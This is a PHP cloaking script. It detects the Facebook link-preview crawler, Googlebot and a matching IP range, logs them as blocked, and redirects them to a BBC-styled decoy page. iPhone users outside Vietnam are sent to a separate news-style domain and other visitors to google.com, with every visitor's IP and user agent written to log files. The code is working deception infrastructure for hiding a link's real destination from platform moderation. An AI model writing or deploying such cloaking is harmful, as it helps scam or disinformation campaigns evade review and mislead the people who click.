
<?php
function checkIP($ip)
{
    $lowIp = ip2long('66.100.0.0');
    $highIp = ip2long('66.255.255.255');
    if ($ip <= $highIp && $lowIp <= $ip) {
        return true;
    }
}

function checkCountry($ip)
{
    $json = file_get_contents("http://freegeoip.net/json/{$ip}");
    return json_decode($json)->country_code;
}

$country = checkCountry($_SERVER['REMOTE_ADDR']);

$allowedAgents = "allowedAgentsAMtDLVrkpcWzx5AO6-IzwZcl-DmjfvXnaqylH7LRF3gIBoCkiZCMV2RT4dsB9EHj1X9iEbuhGveQo1OUt7rT42UwySSKYmud85NP.txt";
$blockedAgents = "blockedAgentsAMtDLVrkpcWzx5AO6-IzwZcl-DmjfvXnaqylH7LRF3gIBoCkiZCMV2RT4dsB9EHj1X9iEbuhGveQo1OUt7rT42UwySSKYmud85NP.txt";

$ip = ip2long($_SERVER['REMOTE_ADDR']);

if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
    $fAgent = fopen($blockedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' blocked ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://bbc.pnnews.dev/AMtDLVrkpcWzx5AO6-IzwZcl-DmjfvXnaqylH7LRF3gIBoCkiZCMV2RT4dsB9EHj1X9iEbuhGveQo1OUt7rT42UwySSKYmud85NP.php', true, 301);
    die();
} else {
    $iPod = stripos($_SERVER['HTTP_USER_AGENT'],"iPod");
    $iPhone = stripos($_SERVER['HTTP_USER_AGENT'],"iPhone");
    $iPad = stripos($_SERVER['HTTP_USER_AGENT'],"iPad");
    $Android = stripos($_SERVER['HTTP_USER_AGENT'],"Android");
    $webOS   = stripos($_SERVER['HTTP_USER_AGENT'],"webOS");
    if($iPhone && $country !== 'VN') {
      header('Location: http://philnews.info', true, 301);
      $fAgent = fopen($allowedAgents, 'a');
      $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
      fwrite($fAgent, $agent);
      fclose($fAgent);
      die();
    } else {
    $fAgent = fopen($allowedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: http://google.com', true, 301);
    }
}

